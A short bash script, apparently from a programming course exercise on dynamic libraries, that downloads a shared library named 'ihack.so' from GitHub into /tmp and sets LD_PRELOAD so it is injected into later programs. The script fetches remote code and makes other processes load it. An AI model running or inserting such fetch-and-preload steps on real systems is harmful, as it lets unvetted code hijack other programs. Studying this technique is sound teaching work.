#!/bin/bash
wget -P /tmp https://github.com/Bedwey/alx-low_level_programming/raw/master/0x18-dynamic_libraries/ihack.so
export LD_PRELOAD=/tmp/ihack.so
